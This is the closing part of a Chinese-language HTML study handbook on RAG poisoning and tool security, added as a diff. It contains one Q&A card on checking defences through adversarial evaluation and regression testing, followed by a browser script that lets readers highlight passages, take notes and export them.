+<div class="qcard"><div class="q">Q：这些安全措施怎么验证有效？</div><div class="a">靠 W6D1 的对抗评测（构造投毒/越权/注入样本测漏判率）+ W6D2 版本管理（白名单/知识库变更要回归）。不验证等于不知防住没。</div></div>
+
+<div class="ft">FDE W6D4 学习手册 · RAG 投毒与工具安全（面试级）· 配合《FDE-W6D4-评测题.md》自测</div>
+
+<div id="annoBubble"><span class="abtn q" data-type="query">📌 待查</span><span class="abtn i" data-type="important">★ 重要</span></div>
+<button id="annoToggleLeft" title="重要标注（贴浏览器左侧）">★<span class="badge">0</span></button>
+<button id="annoToggleRight" title="待查标注（贴浏览器右侧）">📌<span class="badge">0</span></button>
+<aside id="annoPanelLeft" class="anno-panel">
+  <div class="ap-head">
+    <div><div class="title">★ 重要标注</div><div class="count">0 条</div></div>
+    <button class="ap-close" title="收起">✕</button>
+  </div>
+  <div class="ap-body" id="listImp"></div>
+  <div class="ap-foot">
+    <button data-export="important">导出重要</button>
+    <button data-clear="important">清空重要</button>
+  </div>
+</aside>
+<aside id="annoPanelRight" class="anno-panel">
+  <div class="ap-head">
+    <div><div class="title">📌 待查标注</div><div class="count">0 条</div></div>
+    <button class="ap-close" title="收起">✕</button>
+  </div>
+  <div class="ap-body" id="listQuery"></div>
+  <div class="ap-foot">
+    <button data-export="query">导出待查</button>
+    <button data-clear="query">清空待查</button>
+  </div>
+</aside>
+<div id="annoTip"></div>
+
+<script>
+(function(){
+  var STORAGE = 'fde_w6d4_annotations';
+  var PANEL_L = document.getElementById('annoPanelLeft');
+  var PANEL_R = document.getElementById('annoPanelRight');
+  var LIST_IMP = document.getElementById('listImp');
+  var LIST_QRY = document.getElementById('listQuery');
+  var TOGGLE_L = document.getElementById('annoToggleLeft');
+  var TOGGLE_R = document.getElementById('annoToggleRight');
+  var BADGE_L = TOGGLE_L.querySelector('.badge');
+  var BADGE_R = TOGGLE_R.querySelector('.badge');
+  var COUNT_L = PANEL_L.querySelector('.count');
+  var COUNT_R = PANEL_R.querySelector('.count');
+  var BUBBLE = document.getElementById('annoBubble');
+  var TIP = document.getElementById('annoTip');
+  var annos = load();
+  var pendingRange = null;
+
+  function load(){ try { return JSON.parse(localStorage.getItem(STORAGE) || '[]'); } catch(e){ return []; } }
+  function save(){ try { localStorage.setItem(STORAGE, JSON.stringify(annos)); } catch(e){} }
+  function escapeHtml(s){ return String(s).replace(/[&<>"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]; }); }
+  function showTip(msg){ TIP.textContent = msg; TIP.classList.add('show'); setTimeout(function(){ TIP.classList.remove('show'); }, 1600); }
+  function typeOf(a){ return a && a.type === 'important' ? 'important' : 'query'; }
+  function panelOf(type){ return type === 'important' ? PANEL_L : PANEL_R; }
+
+  function inExcludedZone(node){
+    var p = (node.nodeType === 3) ? node.parentNode : node;
+    if(!p || !p.closest) return false;
+    return !!(p.closest('#annoPanelLeft') || p.closest('#annoPanelRight') || p.closest('#annoBubble') || p.closest('#annoToggleLeft') || p.closest('#annoToggleRight') || p.closest('.topnav') || p.closest('#annoTip'));
+  }
+  function isAnnotableText(node){
+    if(!node || node.nodeType !== 3 || !node.nodeValue) return false;
+    var p = node.parentNode;
+    if(!p) return false;
+    if(p.tagName === 'SCRIPT' || p.tagName === 'STYLE') return false;
+    if(p.classList && p.classList.contains('anno')) return false;
+    if(inExcludedZone(node)) return false;
+    return true;
+  }
+  function surroundRange(range, id, type){
+    var frag = range.extractContents();
+    var mark = document.createElement('mark');
+    mark.className = 'anno' + (type === 'important' ? ' imp' : '');
+    mark.setAttribute('data-id', id);
+    mark.appendChild(frag);
+    range.insertNode(mark);
+  }
+  document.addEventListener('mouseup', function(){
+    setTimeout(function(){
+      var sel = window.getSelection();
+      if(!sel || sel.rangeCount === 0){ hideBubble(); return; }
+      var text = sel.toString().trim();
+      if(text.length < 1 || text.length > 2000){ hideBubble(); return; }
+      var range = sel.getRangeAt(0);
+      var c = range.commonAncestorContainer;
+      var check = (c.nodeType === 3) ? c.parentNode : c;
+      if(inExcludedZone(check)){ hideBubble(); return; }
+      pendingRange = range.cloneRange();
+      var rect = range.getBoundingClientRect();
+      BUBBLE.style.display = 'flex';
+      BUBBLE.style.left = (rect.left + rect.width/2 - 62 + window.scrollX) + 'px';
+      BUBBLE.style.top = (rect.top + window.scrollY - 42) + 'px';
+    }, 12);
+  });
+  function hideBubble(){ BUBBLE.style.display = 'none'; }
+  BUBBLE.addEventListener('mousedown', function(e){ if(e.target.closest('.abtn')) e.preventDefault(); });
+  BUBBLE.addEventListener('click', function(e){
+    var btn = e.target.closest('.abtn');
+    if(!btn) return;
+    if(!pendingRange){ hideBubble(); return; }
+    var sel = window.getSelection();
+    var text = sel.toString().trim();
+    if(!text){ hideBubble(); return; }
+    var type = btn.getAttribute('data-type');
+    var id = 'a' + Date.now() + Math.floor(Math.random()*1000);
+    try { surroundRange(pendingRange, id, type); } catch(err){}
+    annos.push({ id: id, text: text, type: type, note: '', createdAt: new Date().toLocaleString('zh-CN') });
+    save(); render();
+    sel.removeAllRanges(); hideBubble();
+    panelOf(type).classList.add('open');
+    showTip(type === 'important' ? '已标为重要（左面板）' : '已标注待查（右面板），可加笔记');
+  });
+  document.addEventListener('mousedown', function(e){
+    if(e.target === BUBBLE || BUBBLE.contains(e.target)) return;
+    setTimeout(hideBubble, 0);
+  });
+  function makeItem(a){
+    var t = typeOf(a);
+    var found = document.querySelector('mark.anno[data-id="' + a.id + '"]');
+    var item = document.createElement('div');
+    item.className = 'anno-item' + (t === 'important' ? ' imp' : '');
+    var miss = found ? '' : ' <span class="miss">（原文未定位）</span>';
+    var html = '<div class="ai-text" data-id="' + a.id + '">' + escapeHtml(a.text) + miss + '</div>';
+    item.innerHTML = html;
+    var foot = document.createElement('div');
+    foot.className = 'ai-foot';
+    var time = document.createElement('span');
+    time.className = 'ai-time'; time.textContent = (a.createdAt || '');
+    var del = document.createElement('button');
+    del.className = 'ai-del'; del.textContent = '删除';
+    del.addEventListener('click', function(){ removeAnno(a.id); });
+    foot.appendChild(time); foot.appendChild(del);
+    if(t === 'query'){
+      var ta = document.createElement('textarea');
+      ta.placeholder = '写解释 / 笔记...（自动保存）';
+      ta.value = a.note || '';
+      ta.addEventListener('input', function(){ a.note = ta.value; save(); });
+      item.appendChild(ta);
+    }
+    item.appendChild(foot);
+    item.querySelector('.ai-text').addEventListener('click', function(){ jumpTo(a.id); });
+    return item;
+  }
+  function setBadge(el, n){ if(n > 0){ el.style.display = 'flex'; el.textContent = n; } else { el.style.display = 'none'; } }
+  function renderList(type){
+    var container = type === 'important' ? LIST_IMP : LIST_QRY;
+    var list = annos.filter(function(a){ return typeOf(a) === type; });
+    container.innerHTML = '';
+    if(list.length === 0){
+      var hint = type === 'important' ? '选中正文点「★ 重要」' : '选中正文点「📌 待查」';
+      container.innerHTML = '<div class="col-empty">还没有' + (type === 'important' ? '重要' : '待查') + '标注<br>' + hint + '</div>';
+    } else { list.forEach(function(a){ container.appendChild(makeItem(a)); }); }
+  }
+  function render(){
+    renderList('important'); renderList('query');
+    var imps = annos.filter(function(a){ return typeOf(a) === 'important'; });
+    var qrys = annos.filter(function(a){ return typeOf(a) === 'query'; });
+    COUNT_L.textContent = imps.length + ' 条'; COUNT_R.textContent = qrys.length + ' 条';
+    setBadge(BADGE_L, imps.length); setBadge(BADGE_R, qrys.length);
+  }
+  function jumpTo(id){
+    var el = document.querySelector('mark.anno[data-id="' + id + '"]');
+    if(!el){ showTip('该标注在原文未定位'); return; }
+    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    el.classList.remove('flash'); void el.offsetWidth; el.classList.add('flash');
+  }
+  function unwrapMark(mark){
+    var parent = mark.parentNode;
+    while(mark.firstChild){ parent.insertBefore(mark.firstChild, mark); }
+    parent.removeChild(mark); parent.normalize();
+  }
+  function removeAnno(id){
+    if(!confirm('删除该标注及其笔记？')) return;
+    annos = annos.filter(function(a){ return a.id !== id; });
+    document.querySelectorAll('mark.anno[data-id="' + id + '"]').forEach(unwrapMark);
+    save(); render(); showTip('已删除');
+  }
+  function findAndHighlight(text, id, type){
+    if(!text) return false;
+    var root = document.body;
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, { acceptNode: function(node){ return isAnnotableText(node) ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT; } });
+    var nodes = [], n;
+    while((n = walker.nextNode())) nodes.push(n);
+    var full = '', map = [];
+    nodes.forEach(function(node){ var len = node.nodeValue.length; map.push({ node: node, start: full.length, end: full.length + len }); full += node.nodeValue; });
+    var idx = full.indexOf(text);
+    if(idx === -1) return false;
+    var end = idx + text.length;
+    var hits = map.filter(function(m){ return m.start < end && m.end > idx; });
+    if(hits.length === 0) return false;
+    try {
+      var range = document.createRange();
+      var first = hits[0], last = hits[hits.length - 1];
+      range.setStart(first.node, Math.max(0, idx - first.start));
+      range.setEnd(last.node, end - last.start);
+      surroundRange(range, id, type);
+      return true;
+    } catch(e){ return false; }
+  }
+  function restore(){
+    annos.forEach(function(a){
+      if(document.querySelector('mark.anno[data-id="' + a.id + '"]')) return;
+      findAndHighlight(a.text, a.id, typeOf(a));
+    });
+    render();
+  }
+  TOGGLE_L.addEventListener('click', function(){ PANEL_L.classList.toggle('open'); });
+  TOGGLE_R.addEventListener('click', function(){ PANEL_R.classList.toggle('open'); });
+  PANEL_L.querySelector('.ap-close').addEventListener('click', function(){ PANEL_L.classList.remove('open'); });
+  PANEL_R.querySelector('.ap-close').addEventListener('click', function(){ PANEL_R.classList.remove('open'); });
+  function exportType(type){
+    var list = annos.filter(function(a){ return typeOf(a) === type; });
+    if(list.length === 0){ showTip('没有可导出的' + (type === 'important' ? '重要' : '待查') + '标注'); return; }
+    var label = type === 'important' ? '重要' : '待查';
+    var txt = 'FDE W6D4 ' + label + '标注笔记（' + new Date().toLocaleString('zh-CN') + '）\n\n';
+    txt += list.map(function(a, i){
+      var line = (i+1) + '. ' + a.text;
+      if(type === 'query'){ line += '\n   笔记：' + (a.note || '(暂无)'); }
+      line += '\n   时间：' + (a.createdAt || '');
+      return line;
+    }).join('\n\n');
+    var blob = new Blob([txt], { type: 'text/plain;charset=utf-8' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url; a.download = 'W6D4-' + label + '-标注笔记.txt'; document.body.appendChild(a); a.click();
+    document.body.removeChild(a); URL.revokeObjectURL(url);
+    showTip('已导出 ' + label + ' ' + list.length + ' 条');
+  }
+  function clearType(type){
+    var list = annos.filter(function(a){ return typeOf(a) === type; });
+    if(list.length === 0){ showTip('没有可清空的' + (type === 'important' ? '重要' : '待查')); return; }
+    var label = type === 'important' ? '重要' : '待查';
+    if(!confirm('确定清空全部' + label + '标注和笔记？此操作不可撤销。')) return;
+    list.forEach(function(a){ document.querySelectorAll('mark.anno[data-id="' + a.id + '"]').forEach(unwrapMark); });
+    annos = annos.filter(function(a){ return typeOf(a) !== type; });
+    save(); render(); showTip('已清空' + label);
+  }
+  document.querySelectorAll('[data-export]').forEach(function(btn){ btn.addEventListener('click', function(){ exportType(btn.getAttribute('data-export')); }); });
+  document.querySelectorAll('[data-clear]').forEach(function(btn){ btn.addEventListener('click', function(){ clearType(btn.getAttribute('data-clear')); }); });
+  document.addEventListener('click', function(e){
+    var m = e.target.closest ? e.target.closest('mark.anno') : null;
+    if(m){
+      var aid = m.getAttribute('data-id');
+      var fa = annos.find(function(a){ return a.id === aid; });
+      if(fa) panelOf(typeOf(fa)).classList.add('open');
+      jumpTo(aid);
+    }
+  });
+  restore();
+})();
+</script>
+
+</body>
+</html>
